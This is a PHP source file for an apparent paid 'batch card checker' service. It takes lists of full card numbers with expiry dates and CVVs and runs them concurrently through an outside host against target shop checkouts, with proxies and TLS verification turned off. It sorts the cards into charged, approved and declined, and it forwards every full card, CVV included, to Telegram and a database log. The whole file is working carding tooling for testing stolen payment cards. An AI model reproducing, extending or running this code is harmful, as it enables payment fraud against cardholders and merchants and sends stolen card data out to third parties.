<?php
/**
 * Batch Card Checker API
 * Handles multiple card checks concurrently
 */

session_start();
require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'cc_logs_manager.php';
require_once 'utils.php';

header('Content-Type: application/json');

// Check if user is authenticated
if (empty($_SESSION['user_id']) && empty($_SESSION['telegram_id'])) {
    echo json_encode([
        'error' => true,
        'message' => 'Authentication required',
        'status' => 'AUTH_REQUIRED'
    ]);
    exit;
}

$db = Database::getInstance();
$telegram_id = $_SESSION['telegram_id'] ?? $_SESSION['user_id'];
$user = $db->getUserByTelegramId($telegram_id);

if (!$user) {
    echo json_encode([
        'error' => true,
        'message' => 'User not found',
        'status' => 'USER_NOT_FOUND'
    ]);
    exit;
}

// Get batch request data
$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['cards']) || !is_array($input['cards'])) {
    echo json_encode([
        'error' => true,
        'message' => 'Invalid request format. Expected JSON with cards array.',
        'status' => 'INVALID_REQUEST'
    ]);
    exit;
}

$cards = $input['cards'];
$sites = $input['sites'] ?? [];
$proxy = $input['proxy'] ?? '';
$useNoProxy = !empty($input['noproxy']);
$max_concurrent = isset($input['concurrent']) ? intval($input['concurrent']) : 5;
$max_concurrent = min(max($max_concurrent, 1), 20); // Limit between 1-20

// Check if user has enough credits
$current_credits = intval($user['credits'] ?? 0);
$cards_count = count($cards);

if ($current_credits < $cards_count) {
    echo json_encode([
        'error' => true,
        'message' => "Insufficient credits. You need $cards_count credits but have only $current_credits.",
        'status' => 'INSUFFICIENT_CREDITS',
        'current_credits' => $current_credits,
        'required_credits' => $cards_count
    ]);
    exit;
}

// Validate cards format
$valid_cards = [];
foreach ($cards as $card) {
    $card = trim($card);
    if (empty($card)) continue;
    
    $card_parts = explode("|", $card);
    if (count($card_parts) == 4) {
        $card_num = $card_parts[0];
        $month = $card_parts[1];
        $year = $card_parts[2];
        $cvv = $card_parts[3];

        if (preg_match("/^\d{13,19}$/", $card_num) && 
            preg_match("/^(0[1-9]|1[0-2])$/", $month) && 
            (preg_match("/^\d{2}$/", $year) || preg_match("/^\d{4}$/", $year)) && 
            preg_match("/^\d{3,4}$/", $cvv)) {
            $valid_cards[] = $card;
        }
    }
}

if (empty($valid_cards)) {
    echo json_encode([
        'error' => true,
        'message' => 'No valid cards found in the request.',
        'status' => 'NO_VALID_CARDS'
    ]);
    exit;
}

// Validate sites
if (empty($sites)) {
    echo json_encode([
        'error' => true,
        'message' => 'At least one site URL is required.',
        'status' => 'NO_SITES'
    ]);
    exit;
}

$valid_sites = [];
foreach ($sites as $site) {
    $site = trim($site);
    if (filter_var($site, FILTER_VALIDATE_URL)) {
        $valid_sites[] = $site;
    }
}

if (empty($valid_sites)) {
    echo json_encode([
        'error' => true,
        'message' => 'No valid site URLs found.',
        'status' => 'NO_VALID_SITES'
    ]);
    exit;
}

/**
 * Check a single card asynchronously
 */
function checkCardAsync($card, $site, $proxy = '', $noproxy = false) {
    $api_url = 'http://legend.sonugamingop.tech/autosh.php';
    $params = [
        'cc' => $card,
        'site' => $site
    ];
    
    if ($noproxy) {
        $params['noproxy'] = 1;
    } elseif (!empty($proxy)) {
        $params['proxy'] = $proxy;
    }
    
    $full_api_url = $api_url . '?' . http_build_query($params);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $reqTimeout = (int) SiteConfig::get('card_check_timeout', 90);
    $connTimeout = (int) SiteConfig::get('card_connect_timeout', 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, $reqTimeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    return $ch;
}

/**
 * Process API response and categorize status
 */
function processApiResponse($output, $card, $site) {
    $response_data = [
        'card' => $card,
        'site' => $site,
        'gateway' => 'N/A',
        'status' => 'API_ERROR',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'ui_status_type' => 'DECLINED'
    ];
    
    if (empty($output)) {
        $response_data['status'] = 'EMPTY_RESPONSE';
        return $response_data;
    }
    
    // Clean response if needed
    $cleaned_output = trim($output);
    if (strpos($cleaned_output, '{') !== false) {
        $json_start = strpos($cleaned_output, '{');
        $cleaned_output = substr($cleaned_output, $json_start);
    }
    
    $json_end = strrpos($cleaned_output, '}');
    if ($json_end !== false) {
        $cleaned_output = substr($cleaned_output, 0, $json_end + 1);
    }
    
    $data = json_decode($cleaned_output, true);
    
    if ($data && json_last_error() === JSON_ERROR_NONE) {
        $api_response_status = strtoupper($data['Response'] ?? 'UNKNOWN_STATUS');
        $gateway = $data['Gateway'] ?? 'shopify_payments';
        $price = $data['Price'] ?? '2.00';
        $proxy_status = $data['ProxyStatus'] ?? 'N/A';
        $proxy_ip = $data['ProxyIP'] ?? 'N/A';
        
        $status_message = $api_response_status;
        $final_status_type = 'DECLINED';
        
        // Categorize response
        if (strpos($api_response_status, 'THANK YOU') !== false || 
            strpos($api_response_status, 'ORDER_PLACED') !== false) {
            $status_message = 'ORDER_PLACED';
            $final_status_type = 'CHARGED';
        } elseif (strpos($api_response_status, '3DS') !== false || 
                  strpos($api_response_status, 'OTP_REQUIRED') !== false ||
                  strpos($api_response_status, '3DS_CC') !== false ||
                  strpos($api_response_status, 'HANDLE IS EMPTY') !== false || 
                  strpos($api_response_status, 'DELIVERY RATES ARE EMPTY') !== false) {
            $status_message = $api_response_status;
            $final_status_type = 'APPROVED';
        } elseif (strpos($api_response_status, 'INSUFFICIENT_FUNDS') !== false || 
                  strpos($api_response_status, 'INCORRECT_CVC') !== false || 
                  strpos($api_response_status, 'INCORRECT_ZIP') !== false) {
            $status_message = $api_response_status;
            $final_status_type = 'APPROVED';
        } elseif (strpos($api_response_status, 'APPROVED') !== false || 
                  strpos($api_response_status, 'LIVE') !== false) {
            $status_message = $api_response_status;
            $final_status_type = 'APPROVED';
        } elseif (strpos($api_response_status, 'EXPIRED_CARD') !== false) {
            $status_message = 'EXPIRE_CARD';
            $final_status_type = 'DECLINED';
        }
        
        $response_data = [
            'card' => $card,
            'site' => $site,
            'gateway' => $gateway,
            'status' => $status_message,
            'price' => $price,
            'ui_status_type' => $final_status_type,
            'proxy_status' => $proxy_status,
            'proxy_ip' => $proxy_ip,
            'raw_api_response' => $api_response_status
        ];
    }
    
    return $response_data;
}

// Process cards in batches using curl_multi
$results = [];
$total_cards = count($valid_cards);
$processed = 0;
$failed_cards = 0;

// Process in chunks
for ($i = 0; $i < $total_cards; $i += $max_concurrent) {
    $chunk = array_slice($valid_cards, $i, $max_concurrent);
    $multi_handle = curl_multi_init();
    $curl_handles = [];
    
    foreach ($chunk as $index => $card) {
        // Randomly select a site
        $site = $valid_sites[array_rand($valid_sites)];
        
    $ch = checkCardAsync($card, $site, $proxy, $useNoProxy);
        curl_multi_add_handle($multi_handle, $ch);
        $curl_handles[] = [
            'handle' => $ch,
            'card' => $card,
            'site' => $site,
            'start_time' => microtime(true)
        ];
    }
    
    // Execute all queries simultaneously
    $running = null;
    do {
        curl_multi_exec($multi_handle, $running);
        curl_multi_select($multi_handle);
    } while ($running > 0);
    
    // Get results
    foreach ($curl_handles as $handle_info) {
        $ch = $handle_info['handle'];
        $card = $handle_info['card'];
        $site = $handle_info['site'];
        $start_time = $handle_info['start_time'];
        
        $output = curl_multi_getcontent($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $end_time = microtime(true);
        $time_taken = round(($end_time - $start_time) * 1000, 2);
        
        if ($curl_error || $http_code >= 400) {
            $result = [
                'card' => $card,
                'site' => $site,
                'gateway' => 'N/A',
                'status' => $curl_error ? "CURL_ERROR: $curl_error" : "HTTP_ERROR: $http_code",
                'price' => '0.00',
                'time' => $time_taken . 'ms',
                'ui_status_type' => 'DECLINED',
                'proxy_status' => 'N/A',
                'proxy_ip' => 'N/A'
            ];
            $failed_cards++;
        } else {
            $result = processApiResponse($output, $card, $site);
            $result['time'] = $time_taken . 'ms';
        }
        
    $results[] = $result;
        $processed++;
        
        // Telegram notification per result (default ON or charged-only)
        try {
            if (function_exists('sendTelegramHtml')) {
                $shouldAll = (bool) SiteConfig::get('notify_card_results', true);
                $shouldCharged = (bool) SiteConfig::get('notify_card_charged', true);
                $type = $result['ui_status_type'];
                if ($shouldAll || ($type === 'CHARGED' && $shouldCharged)) {
                    $emoji = ($type === 'CHARGED') ? '✅' : (($type === 'APPROVED') ? '🟢' : (($type === 'DECLINED') ? '❌' : '⚠️'));
                    $card_parts_nt = explode('|', $card);
                    $cc = $card_parts_nt[0] ?? $card;
                    $mes = $card_parts_nt[1] ?? '';
                    $ano = $card_parts_nt[2] ?? '';
                    $cvv_show = $card_parts_nt[3] ?? '';
                    $notif = "💳 <b>Card Checked</b>\n\n" .
                             "👤 <b>User ID:</b> {$telegram_id}\n" .
                             "💳 <b>Card:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv_show}</code>\n" .
                             "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n" .
                             "📣 <b>Response:</b> " . htmlspecialchars($result['status']) . "\n" .
                             "🟩 <b>Status:</b> " . htmlspecialchars($type) . " {$emoji}\n" .
                             "🏦 <b>Gateway:</b> " . htmlspecialchars($result['gateway']) . "\n" .
                             "💵 <b>Amount:</b> " . htmlspecialchars($result['price']) . "\n" .
                             "⏱️ <b>Time:</b> " . htmlspecialchars($result['time']);
                    sendTelegramHtml($notif);
                }
            }
        } catch (Exception $e) {
            error_log('Telegram send error (batch): ' . $e->getMessage());
        }

        // Log to database
        try {
            $card_parts = explode("|", $card);
            $ccLogger = new CCLogsManager();
            $statusForLog = strtolower($result['ui_status_type']) === 'approved' ? 'live' : strtolower($result['ui_status_type']);
            $ccLogger->logCCCheck([
                'telegram_id' => $telegram_id,
                'username' => $user['username'] ?? 'Unknown',
                'card_number' => $card_parts[0] ?? $card,
                'card_full' => $card,
                'status' => $statusForLog,
                'message' => $result['status'],
                'gateway' => $result['gateway'],
                'amount_charged' => ($result['ui_status_type'] === 'CHARGED') ? floatval($result['price']) : 0,
                'currency' => 'USD'
            ]);
        } catch (Exception $e) {
            error_log("Failed to log CC check: " . $e->getMessage());
        }
        
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    
    curl_multi_close($multi_handle);
}

// Deduct credits after successful checks
$credits_to_deduct = $processed;
$credit_deducted = $db->deductCredits($telegram_id, $credits_to_deduct);

// Categorize results
$charged = [];
$approved = [];
$declined = [];

foreach ($results as $result) {
    $type = $result['ui_status_type'];
    if ($type === 'CHARGED') {
        $charged[] = $result;
    } elseif ($type === 'APPROVED') {
        $approved[] = $result;
    } else {
        $declined[] = $result;
    }
}

// Send response
echo json_encode([
    'success' => true,
    'total_cards' => $total_cards,
    'processed' => $processed,
    'failed' => $failed_cards,
    'credits_deducted' => $credit_deducted ? $credits_to_deduct : 0,
    'remaining_credits' => $current_credits - ($credit_deducted ? $credits_to_deduct : 0),
    'summary' => [
        'charged' => count($charged),
        'approved' => count($approved),
        'declined' => count($declined)
    ],
    'results' => [
        'charged' => $charged,
        'approved' => $approved,
        'declined' => $declined
    ]
]);
http_response_code(200);

?>
